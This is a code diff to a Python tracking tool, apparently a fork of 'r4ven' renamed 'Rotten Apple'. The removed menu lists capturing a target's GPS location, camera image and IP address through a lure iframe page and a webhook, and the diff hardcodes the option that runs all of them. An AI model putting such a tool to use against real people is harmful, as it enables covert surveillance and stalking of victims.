@@ -8,7 +8,7 @@ from banner import print_banners
 from port_forward import run_tunnel, start_port_forwarding, ask_port_forwarding, shutdown_flag, run_flask, args, get_file_data, is_port_available
 
 # Set up logging
-log_file = "r4ven.log"
+log_file = "rotten-apple.log"
 logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')
 
 if sys.stdout.isatty():
@@ -22,18 +22,9 @@ if sys.stdout.isatty():
 else:
     R = G = C = W = Y = M = B = ''
 
-def get_user_choice():
-    print(f"{B}[~] {C}What would you like to do?{W}\n")
-    print(f"{Y}1. {W}Track Target GPS Location")
-    print(f"{Y}2. {W}Capture Target Image")
-    print(f"{Y}3. {W}Fetch Target IP Address")
-    print(f"{Y}4. {W}All Of It")
-    print(f"\n{M}Note: {W}IP address & Device details available in all the options")
-    choice = input(f"\n{B}[+] {Y}Enter the number corresponding to your choice: {W}")
-    return choice
-
 def main():
-    print_banners()
+    #print_banners()
+    print("Rotten Apple - Testing tracking application for learning\n")
 
     log_file_path = os.path.abspath(log_file)
     print(f"{B}[+] {Y}Logs :{W} {log_file_path}\n")
@@ -46,7 +37,8 @@ def main():
     #print(f"{B}[!] {Y}Port : {W} {args.port} {G} is available.{W}")
     print(f'____________________________________________________________________________\n')
 
-    choice = get_user_choice()
+    #choice = get_user_choice()
+    choice = '4'
 
     if choice not in ['1', '2', '3', '4']:
         print(f"{R}Invalid choice. Exiting.{W}")
@@ -64,7 +56,8 @@ def main():
     check_and_get_webhook_url(folder_name)
 
     # Ask for iframe URL
-    iframe_url = input(f"\n{B}[+] {Y}Enter iframe URL (default: https://www.youtube.com/): {W}").strip()
+    #iframe_url = input(f"\n{B}[+] {Y}Enter iframe URL (default: https://www.youtube.com/): {W}").strip()
+    iframe_url = "https://www.youtube.com/"
     if iframe_url:
         os.environ['IFRAME_URL'] = iframe_url
         print(f"{G}[✓] {C}Iframe URL set to: {W}{iframe_url}")
